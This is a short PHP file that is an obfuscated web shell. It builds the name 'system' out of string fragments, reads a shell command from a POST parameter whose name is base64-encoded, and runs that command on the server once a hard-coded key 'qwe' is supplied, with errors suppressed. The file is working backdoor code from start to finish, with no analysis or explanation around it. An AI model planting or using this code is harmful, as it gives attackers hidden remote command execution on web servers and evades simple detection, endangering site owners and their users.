<?php
class shell{
    function __construct($arg, $key)
    {
        return $this->www($arg, $key);
    }
    function www($arg, $key){
        $fun = 'sss';
        $fun[1] = 'y';
        $fun .= 'tem';
        if ($key==='qwe'){
            $result = $fun($arg);
        }
        return @$result;
    }
}
$arg=base64_decode("MjMzMw==");  // PHP >= 5.3
$arg=$_POST[$arg];
$key=$_POST['key'];
$c = new shell($arg, $key);